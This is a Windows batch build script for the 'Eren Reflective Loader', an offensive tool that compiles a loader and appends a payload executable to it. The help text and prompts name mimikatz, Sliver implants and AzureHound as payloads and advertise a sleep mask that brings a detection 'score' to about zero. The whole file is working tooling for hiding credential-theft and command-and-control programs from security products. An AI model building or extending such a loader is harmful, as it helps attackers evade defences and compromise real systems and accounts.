@echo off
setlocal enabledelayedexpansion
REM ============================================================================
REM  Eren Reflective Loader - Build
REM  Usage:   build.bat [/native|/go] [/debug] <payload.exe>
REM ============================================================================

REM ---- Parse flags ----
set DEBUG=
set PAYLOAD=
set MODE=

:parse
if "%1"=="" goto check
if /i "%1"=="/?"  goto help
if /i "%1"=="-h"  goto help
if /i "%1"=="--help" goto help
if /i "%1"=="/native" (set MODE=native& shift& goto parse)
if /i "%1"=="/go"     (set MODE=go& shift& goto parse)
if /i "%1"=="/debug"  (set DEBUG=/DDEBUG& shift& goto parse)
if /i "%1"=="-debug"  (set DEBUG=/DDEBUG& shift& goto parse)
set PAYLOAD=%~f1
shift
goto parse

:check
if "%PAYLOAD%"=="" goto help
if not exist "%PAYLOAD%" (
    echo [!] Payload not found: %PAYLOAD%
    exit /b 1
)

REM ---- Switch to script directory ----
cd /d "%~dp0"

REM ---- Interactive mode selection ----
if not "%MODE%"=="" goto pick_compiler
echo.
echo ==================================================================
echo  Select payload type:
echo    1. Native (C/C++ - mimikatz, custom implants^)
echo       g++ build - full sleep mask VEH+timer, dynamic score ~0
echo    2. Go     (Go runtime - AzureHound, Sliver^)
echo       MSVC build - no sleep mask, dynamic score ~38
echo ==================================================================
set /p CHOICE="  Enter 1 or 2: "
if "%CHOICE%"=="1" (set MODE=native& goto pick_compiler)
if "%CHOICE%"=="2" (set MODE=go& goto pick_compiler)
echo [!] Invalid choice. Enter 1 or 2.
exit /b 1

:pick_compiler
REM ---- Go = MSVC required (g++ CRT breaks Go runtime) ----
if /i "%MODE%"=="go" (
    where cl >nul 2>&1
    if errorlevel 1 (
        echo [!] Go payloads require MSVC. Run from x64 Native Tools Command Prompt.
        exit /b 1
    )
    set COMPILER=msvc
    set SRC=eren_nosleep.cpp
    echo [*] Go payload - MSVC, no sleep mask
    goto build
)

REM ---- Native = prefer g++ ----
where g++ >nul 2>&1
if not errorlevel 1 (
    set COMPILER=g++
    set SRC=eren.cpp
    echo [*] Native payload - g++ build, full sleep mask
    goto build
)

REM ---- g++ not found, fall back to MSVC (no sleep mask) ----
where cl >nul 2>&1
if not errorlevel 1 (
    set COMPILER=msvc
    set SRC=eren_nosleep.cpp
    echo [*] Native payload - MSVC fallback (no sleep mask, install g++ for sleep mask^)
    goto build
)

echo [!] No compiler found. Install Visual Studio 2022 or LLVM-MinGW.
exit /b 1

:build
for %%F in ("%PAYLOAD%") do echo [*] Payload: %%~nxF (%%~zF bytes)
echo.

REM ---- Ensure vcvars64 for MSVC builds ----
if "%COMPILER%"=="msvc" call :vcvars

REM ---- Compile BlobPrep ----
echo [*] Building BlobPrep (%COMPILER%^)...
if "%COMPILER%"=="g++" (
    g++ -std=c++17 -O2 -static -DNDEBUG -D_WIN64 -DWIN32 -D_WINDOWS -I. -o BlobPrep.exe Sauron\BlobPrep.cpp -lntdll -lkernel32
) else (
    cl /std:c++17 /O2 /MT /EHa /DNDEBUG /D_WIN64 /DWIN32 /D_WINDOWS /I. Sauron\BlobPrep.cpp /link /OUT:BlobPrep.exe /SUBSYSTEM:CONSOLE /alternatename:___chkstk_ms=__chkstk kernel32.lib ntdll.lib libucrt.lib libvcruntime.lib
)
if errorlevel 1 goto fail
echo [+] BlobPrep.exe built

REM ---- Compile Loader ----
echo [*] Building loader (%SRC%^)...
if "%COMPILER%"=="g++" (
    g++ -std=c++17 -O2 -static -DNDEBUG -D_WIN64 -DWIN32 -D_WINDOWS %DEBUG% -I. -o eren.exe %SRC% -lntdll -lkernel32
) else (
    cl /std:c++17 /O2 /MT /EHa /DNDEBUG /D_WIN64 /DWIN32 /D_WINDOWS %DEBUG% /I. %SRC% /link /OUT:eren.exe /SUBSYSTEM:CONSOLE /alternatename:___chkstk_ms=__chkstk kernel32.lib ntdll.lib libucrt.lib libvcruntime.lib
)
if errorlevel 1 goto fail
echo [+] eren.exe built

REM ---- Append overlay ----
echo [*] Appending payload overlay...
.\BlobPrep.exe eren.exe "%PAYLOAD%"
if errorlevel 1 goto fail

REM ---- Done ----
for %%F in (eren.exe) do set SIZE=%%~zF
echo.
echo ==================================================================
echo  BUILD SUCCESS
echo    Output: %CD%\eren.exe (%SIZE% bytes)
echo    Mode:   %MODE% (%COMPILER%^)
echo ==================================================================
exit /b 0

REM ---- VCVARS auto-detect ----
:vcvars
if not "%INCLUDE%"=="" exit /b 0
for %%P in (Community Professional Enterprise) do (
    if exist "C:\Program Files\Microsoft Visual Studio\2022\%%P\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files\Microsoft Visual Studio\2022\%%P\VC\Auxiliary\Build\vcvars64.bat" >NUL 2>&1
        exit /b 0
    )
)
exit /b 0

:fail
echo [!] Build failed
exit /b 1

:help
echo.
echo ==================================================================
echo  Eren Reflective Loader - Build Script
echo ==================================================================
echo.
echo  Usage:   build.bat [/native^|/go] [/debug] ^<payload.exe^>
echo.
echo  Modes:
echo    /native   Native payload (g++ preferred, full sleep mask VEH+timer^)
echo    /go       Go runtime payload (MSVC required, no sleep mask^)
echo    (omit)    Interactive prompt
echo.
echo  Examples:
echo    build.bat azurehound.exe          (interactive prompt^)
echo    build.bat /go azurehound.exe      (Go payload, MSVC^)
echo    build.bat /native mimikatz.exe    (Native payload, g++ sleep mask^)
echo    build.bat /debug /native test.exe
echo.
echo  Go payloads require MSVC - g++ CRT is incompatible with Go runtime.
echo ==================================================================
exit /b 0
